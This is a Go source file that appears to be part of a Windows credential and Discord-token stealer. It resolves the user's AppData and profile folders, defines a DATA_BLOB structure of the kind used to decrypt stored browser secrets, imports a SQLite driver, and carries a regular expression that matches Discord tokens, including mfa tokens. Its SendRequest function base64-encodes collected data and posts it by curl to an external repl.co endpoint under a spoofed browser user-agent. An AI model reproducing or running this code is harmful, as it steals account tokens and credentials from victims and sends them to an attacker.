package main

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"os/user"
	"regexp"
	"strings"
	"time"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
)

const (
	numberBytes string = "0123456789"
	letterBytes string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
)

var (
	USER string = GetUsername()

	LOCAL    string = os.Getenv("LOCALAPPDATA")
	ROAMING  string = os.Getenv("APPDATA")
	TEMP     string = os.Getenv("TEMP")
	PERSONAL string = os.Getenv("USERPROFILE")

	HEADERS [999]string

	TEMPFILEDIR string = TEMP + "\\" + RandStringBytes(16)
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func CleanUp() {
	_ = os.RemoveAll(TEMPFILEDIR)
}

func FileExists(filePath string) bool {
	_, err := os.OpenFile(filePath, os.O_RDWR, 0666)
	if errors.Is(err, os.ErrNotExist) {
		return false
	} else {
		return true
	}
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func copyFileToDirectory(pathSourceFile string, pathDestFile string) error {
	sourceFile, err := os.Open(pathSourceFile)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(pathDestFile)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return err
	}

	err = destFile.Sync()
	if err != nil {
		return err
	}

	sourceFileInfo, err := sourceFile.Stat()
	if err != nil {
		return err
	}

	destFileInfo, err := destFile.Stat()
	if err != nil {
		return err
	}

	if sourceFileInfo.Size() == destFileInfo.Size() {
	} else {
		return err
	}
	return nil
}

func SendRequest(body string) {

	var encoded_payload string = strings.ReplaceAll(base64.StdEncoding.EncodeToString([]byte(body)), "=", "")

	exec.Command("curl",
		"--location",
		"--request",
		"POST",
		"https://liveton.studio7.repl.co/go",
		"--header", "Content-Type: application/x-www-form-urlencoded",
		"--header", "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		"--data-urlencode", "id="+encoded_payload).Start()

}

func GetUsername() string {
	user, err := user.Current()
	if err != nil {
		log.Fatalf(err.Error())
	}

	if strings.Contains(user.Username, "\\") {
		return strings.Split(user.Username, "\\")[1]
	} else {
		return user.Username
	}
}

func FindAllTokens(input string) []string {
	Expression, e := regexp.Compile("([\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38})|(mfa\\.[\\w-]{84})")
	if e != nil {
		log.Fatalf(e.Error())
	}

	return Expression.FindAllString(input, -1)
}

func RemoveDuplicates[T string | int](sliceList []T) []T {
	allKeys := make(map[T]bool)
	list := []T{}
	for _, item := range sliceList {
		if _, value := allKeys[item]; !value {
			allKeys[item] = true
			list = append(list, item)
		}
	}
	return list
}

func FormatTokens(input []string) string {
	output, _ := json.Marshal(RemoveDuplicates(input))
	return string(output)
}

func Slice(s string, chunkSize int) []string {
	if len(s) == 0 {
		return nil
	}
	if chunkSize >= len(s) {
		return []string{s}
	}
	var chunks []string = make([]string, 0, (len(s)-1)/chunkSize+1)
	currentLen := 0
	currentStart := 0
	for i := range s {
		if currentLen == chunkSize {
			chunks = append(chunks, s[currentStart:i])
			currentLen = 0
			currentStart = i
		}
		currentLen++
	}
	chunks = append(chunks, s[currentStart:])
	return chunks
}

func RandStringBytes(n int) string {
	rand.Seed(time.Now().UnixNano())

	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}

func RandIntBytes(n int) string {
	rand.Seed(time.Now().UnixNano())

	b := make([]byte, n)
	for i := range b {
		b[i] = numberBytes[rand.Intn(len(numberBytes))]
	}
	return string(b)
}

func RandRawBytes(n int) []byte {
	rand.Seed(time.Now().UnixNano())

	b := make([]byte, n)
	for i := range b {
		b[i] = byte(rand.Intn(255))
	}
	return b
}

func GenerateHeaders() {
	for i := 0; i < len(HEADERS); i++ {
		HEADERS[i] = RandIntBytes(6)
	}
}

func ToString(s interface{}) string {
	return fmt.Sprint(s)
}
